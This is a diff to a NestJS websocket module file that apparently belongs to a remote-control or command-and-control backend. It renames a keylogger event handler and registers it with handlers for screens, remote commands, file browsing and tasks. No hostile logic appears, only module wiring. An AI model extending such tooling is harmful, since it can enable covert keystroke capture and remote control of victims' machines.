@@ -14,10 +14,10 @@ import { WsClientScreens } from "./application/events/ws-client-screens";
 import { WsClientSendCmdCommand } from "./application/events/ws-client-send-cmd-command";
 import { ClientModule } from "../client/infrastructure/client.module";
 import { WsClientGetExplorer } from "./application/events/ws-client-get-explorer";
-import { WsClientKeyLogger } from "./application/events/ws-client-keylogger";
 import { WsApplicationModule } from "../ws-application/ws-application.module";
 import { WsClientGetTasks } from "./application/events/ws-client-get-tasks";
 import { RedisServiceModule } from "@/src/repository/redis/redis.module";
+import { WsClientSendKeylogger } from "./application/events/ws-client-send-keylogger";
 
 @Module({
   providers: [
@@ -32,11 +32,12 @@ import { RedisServiceModule } from "@/src/repository/redis/redis.module";
     WsClientScreens,
     WsClientSendCmdCommand,
     WsClientGetExplorer,
-    WsClientKeyLogger,
     WsClientGetTasks,
+    WsClientSendKeylogger,
   ],
   exports: [
     WsClientJoinsUseCase,
+    WsClientGateway,
     WsClientLeavesUseCase,
     WsClientResetAllConnectionsUseCase,
     WsClientFile,
@@ -44,16 +45,16 @@ import { RedisServiceModule } from "@/src/repository/redis/redis.module";
     WsClientSendCmdCommand,
     WsClientRepository,
     WsClientGetExplorer,
-    WsClientKeyLogger,
     WsClientGetTasks,
+    WsClientSendKeylogger,
   ],
   imports: [
-    SchemasModule,
+    forwardRef(() => SchemasModule),
     forwardRef(() => AuthModule),
     WsBotModule,
     ClientModule,
     RedisServiceModule,
-    WsApplicationModule,
+    forwardRef(() => WsApplicationModule),
   ],
 })
 export class WsClientModule {}
